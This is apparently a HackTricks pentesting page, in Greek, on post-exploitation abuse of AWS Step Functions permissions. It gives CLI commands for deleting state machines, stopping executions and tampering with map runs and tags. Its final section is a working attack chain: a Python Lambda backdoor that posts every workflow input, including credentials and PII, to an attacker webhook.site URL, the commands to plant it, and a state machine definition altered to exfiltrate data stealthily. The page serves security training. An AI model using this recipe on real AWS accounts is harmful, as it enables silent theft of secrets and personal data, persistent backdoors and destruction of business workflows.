# AWS - Step Functions Post Exploitation

{{#include ../../../../banners/hacktricks-training.md}}

## Step Functions

Για περισσότερες πληροφορίες σχετικά με αυτή την υπηρεσία AWS, δείτε:

{{#ref}}
../../aws-services/aws-stepfunctions-enum.md
{{#endref}}

### `states:RevealSecrets`

Αυτό το permission επιτρέπει την αποκάλυψη μυστικών δεδομένων μέσα σε μια εκτέλεση. Για αυτό, χρειάζεται να οριστεί το Inspection level σε TRACE και η παράμετρος `revealSecrets` σε `true`.

<figure><img src="../../../images/image (348).png" alt=""><figcaption></figcaption></figure>

### `states:DeleteStateMachine`, `states:DeleteStateMachineVersion`, `states:DeleteStateMachineAlias`

Ένας attacker με αυτά τα permissions θα μπορούσε να διαγράψει μόνιμα state machines, τις versions τους και aliases. Αυτό μπορεί να διαταράξει κρίσιμα workflows, να προκαλέσει απώλεια δεδομένων και να απαιτήσει σημαντικό χρόνο για την ανάκτηση και την επαναφορά των επηρεαζόμενων state machines. Επιπλέον, θα επέτρεπε σε έναν attacker να καλύψει τα χρησιμοποιημένα ίχνη, να διαταράξει forensic investigations και ενδεχομένως να παραλύσει τις operations αφαιρώντας απαραίτητες διαδικασίες automation και state configurations.

> [!NOTE]
>
> - Διαγράφοντας ένα state machine, διαγράφετε επίσης όλες τις συσχετιζόμενες versions και aliases.
> - Διαγράφοντας ένα state machine alias, δεν διαγράφετε τις state machine versions που αναφέρονται σε αυτό το alias.
> - Δεν είναι δυνατή η διαγραφή μιας state machine version που αυτή τη στιγμή αναφέρεται από ένα ή περισσότερα aliases.
```bash
# Delete state machine
aws stepfunctions delete-state-machine --state-machine-arn <value>
# Delete state machine version
aws stepfunctions delete-state-machine-version --state-machine-version-arn <value>
# Delete state machine alias
aws stepfunctions delete-state-machine-alias --state-machine-alias-arn <value>
```
- **Πιθανός αντίκτυπος**: Διατάραξη κρίσιμων ροών εργασίας, απώλεια δεδομένων και διακοπή λειτουργίας.

### `states:UpdateMapRun`

Ένας επιτιθέμενος με αυτήν την άδεια θα μπορούσε να χειριστεί τη ρύθμιση αποτυχίας του Map Run και την παράμετρο parallel, έχοντας τη δυνατότητα να αυξήσει ή να μειώσει τον μέγιστο αριθμό επιτρεπόμενων εκτελέσεων παιδικών ροών εργασίας, επηρεάζοντας άμεσα την απόδοση της υπηρεσίας. Επιπλέον, ένας επιτιθέμενος θα μπορούσε να αλλοιώσει το ποσοστό και τον αριθμό των ανεκτών σφαλμάτων, μειώνοντας αυτήν την τιμή στο 0, ώστε κάθε φορά που ένα στοιχείο αποτυγχάνει, ολόκληρο το Map Run να αποτυγχάνει, επηρεάζοντας άμεσα την εκτέλεση της state machine και ενδεχομένως διαταράσσοντας κρίσιμες ροές εργασίας.
```bash
aws stepfunctions update-map-run --map-run-arn <value> [--max-concurrency <value>] [--tolerated-failure-percentage <value>] [--tolerated-failure-count <value>]
```
- **Πιθανός Αντίκτυπος**: Υποβάθμιση απόδοσης και διακοπή κρίσιμων ροών εργασίας.

### `states:StopExecution`

Ένας επιτιθέμενος με αυτήν την άδεια θα μπορούσε να σταματήσει την εκτέλεση οποιασδήποτε state machine, διαταράσσοντας τρέχουσες ροές εργασίας και διαδικασίες. Αυτό μπορεί να οδηγήσει σε μη ολοκληρωμένες συναλλαγές, παύση επιχειρησιακών λειτουργιών και πιθανή διαφθορά δεδομένων.

> [!WARNING]
> Αυτή η ενέργεια δεν υποστηρίζεται από **express state machines**.
```bash
aws stepfunctions stop-execution --execution-arn <value> [--error <value>] [--cause <value>]
```
- **Πιθανός αντίκτυπος**: Διατάραξη των τρεχουσών ροών εργασίας, διακοπή λειτουργίας και πιθανή διαφθορά δεδομένων.

### `states:TagResource`, `states:UntagResource`

Ένας επιτιθέμενος θα μπορούσε να προσθέσει, να τροποποιήσει ή να αφαιρέσει tags από πόρους του Step Functions, διαταράσσοντας την κατανομή κόστους του οργανισμού σας, την παρακολούθηση πόρων και τις πολιτικές ελέγχου πρόσβασης που βασίζονται σε tags.
```bash
aws stepfunctions tag-resource --resource-arn <value> --tags Key=<key>,Value=<value>
aws stepfunctions untag-resource --resource-arn <value> --tag-keys <key>
```
**Πιθανός Αντίκτυπος**: Διατάραξη της κατανομής κόστους, της παρακολούθησης πόρων και των πολιτικών ελέγχου πρόσβασης βάσει ετικετών.

---

### `states:UpdateStateMachine`, `lambda:UpdateFunctionCode`

Ένας attacker που παραβιάσει έναν χρήστη ή ρόλο με τα ακόλουθα δικαιώματα:
```json
{
"Version": "2012-10-17",
"Statement": [
{
"Sid": "AllowUpdateStateMachine",
"Effect": "Allow",
"Action": "states:UpdateStateMachine",
"Resource": "*"
},
{
"Sid": "AllowUpdateFunctionCode",
"Effect": "Allow",
"Action": "lambda:UpdateFunctionCode",
"Resource": "*"
}
]
}
```
...μπορεί να διεξάγει μια **high-impact and stealthy post-exploitation attack** συνδυάζοντας Lambda backdooring με Step Function logic manipulation.

Αυτό το σενάριο υποθέτει ότι το θύμα χρησιμοποιεί **AWS Step Functions για να ορχηστρώσει workflows που επεξεργάζονται ευαίσθητο input**, όπως credentials, tokens, ή PII.

Παράδειγμα κλήσης του θύματος:
```bash
aws stepfunctions start-execution \
--state-machine-arn arn:aws:states:us-east-1:<victim-account-id>:stateMachine:LegitStateMachine \
--input '{"email": "victim@example.com", "password": "hunter2"}' --profile victim
```
Εάν το Step Function είναι διαμορφωμένο να καλεί ένα Lambda όπως `LegitBusinessLogic`, ο attacker μπορεί να προχωρήσει με **two stealthy attack variants**:

---

####  Ενημερώθηκε η lambda function

Ο attacker τροποποιεί τον κώδικα της Lambda function που ήδη χρησιμοποιείται από το Step Function (`LegitBusinessLogic`) για να silently exfiltrate input data.
```python
# send_to_attacker.py
import requests

def lambda_handler(event, context):
requests.post("https://webhook.site/<attacker-id>/exfil", json=event)
return {"status": "exfiltrated"}
```

```bash
zip function.zip send_to_attacker.py

aws lambda update-function-code \
--function-name LegitBusinessLogic \
--zip-file fileb://function.zip -profile attacker
```
---

#### Προσθήκη Κακόβουλης Κατάστασης στο Step Function

Εναλλακτικά, ο επιτιθέμενος μπορεί να εισάγει μια **exfiltration state** στην αρχή της ροής εργασίας ενημερώνοντας τον ορισμό του Step Function.
```malicious_state_definition.json
{
"Comment": "Backdoored for Exfiltration",
"StartAt": "OriginalState",
"States": {
"OriginalState": {
"Type": "Task",
"Resource": "arn:aws:lambda:us-east-1:<victim-id>:function:LegitBusinessLogic",
"End": true
}
}
}

```

```bash
aws stepfunctions update-state-machine \
--state-machine-arn arn:aws:states:us-east-1:<victim-id>:stateMachine:LegitStateMachine \
--definition file://malicious_state_definition.json --profile attacker
```
Ο attacker μπορεί να είναι ακόμη πιο stealthy και να ενημερώσει τον ορισμό της κατάστασης σε κάτι τέτοιο
{
"Comment": "Backdoored for Exfiltration",
"StartAt": "ExfiltrateSecrets",
"States": {
"ExfiltrateSecrets": {
"Type": "Task",
"Resource": "arn:aws:lambda:us-east-1:victim-id:function:SendToAttacker",
"InputPath": "$",
"ResultPath": "$.exfil",
"Next": "OriginalState"
},
"OriginalState": {
"Type": "Task",
"Resource": "arn:aws:lambda:us-east-1:victim-id:function:LegitBusinessLogic",
"End": true
}
}
}
όπου ο victim δεν θα αντιληφθεί τη διαφορά

---

### Victim Setup (Context for Exploit)

- A Step Function (`LegitStateMachine`) χρησιμοποιείται για την επεξεργασία ευαίσθητης εισόδου χρήστη.
- Καλεί μία ή περισσότερες Lambda functions όπως `LegitBusinessLogic`.

---

**Πιθανός Αντίκτυπος**:
- Σιωπηλή exfiltration ευαίσθητων δεδομένων, συμπεριλαμβανομένων secrets, credentials, API keys, και PII.
- Χωρίς εμφανή σφάλματα ή αποτυχίες στην εκτέλεση του workflow.
- Δύσκολο να ανιχνευθεί χωρίς έλεγχο (audit) του κώδικα των Lambda ή των execution traces.
- Επιτρέπει μακροχρόνια persistence αν το backdoor παραμείνει στον κώδικα ή στη λογική ASL.


{{#include ../../../../banners/hacktricks-training.md}}
